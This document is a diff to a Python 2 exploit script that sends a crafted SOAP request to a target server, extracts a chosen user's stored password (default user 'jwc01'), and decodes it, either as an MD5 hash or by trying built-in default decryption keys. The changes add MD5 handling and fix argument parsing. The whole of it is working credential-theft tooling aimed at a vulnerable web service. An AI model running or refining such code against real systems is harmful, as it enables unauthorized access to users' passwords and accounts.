@@ -8,6 +8,7 @@
 """
 
 import argparse
+import base64
 import re
 import requests
 import sys
@@ -37,7 +38,7 @@ def decode(value, key):
     return result
 
 
-def get_password(target, user='jwc01'):
+def get_password(target, user):
     data = """<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
   <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
@@ -56,16 +57,20 @@ def get_password(target, user='jwc01'):
     password = re.findall('<xh xsi:type="xsd:string">(.+?)</xh>',
                           res.text, re.S)
     if len(password) != 1:
-        print '[ERROR] Can not retrive %s\'s password.' % (user)
+        print '[ERROR] Can not retrive %s\'s password' % (user)
         sys.exit(-1)
     password = password[0]
-    yes = raw_input(
-        '[*] Do you want to decrypt the password using the default keys? ')
-    if yes == 'y' or yes == 'yes':
-        for k in KEYS:
-            print '[-] Key ' + k + ': ' + decode(password, k)
+    print '[-] The encrypted password of %s is: %s' % (user, password)
+    MD5_HEAD = '{MD5}'
+    if password.startswith(MD5_HEAD):
+        print '[-] Password in MD5 form: %s' % (
+            base64.b64decode(password[len(MD5_HEAD):]).encode('hex'))
     else:
-        print '[-] The encrypted password of %s is: %s.' % (user, password)
+        yes = raw_input(
+            '[*] Do you want to decrypt the password using the default keys? ')
+        if yes == 'y' or yes == 'yes':
+            for k in KEYS:
+                print '[-] Key ' + k + ': ' + decode(password, k)
 
 
 def main(argv):
@@ -75,7 +80,7 @@ def main(argv):
     parser.add_argument('-u', '--user', type=str,
                         help='The user you want to get password from.')
     args = vars(parser.parse_args(argv))
-    if 'user' not in args:
+    if args['user'] is None:
         args['user'] = 'jwc01'
     target = args['target']
     if target is None:
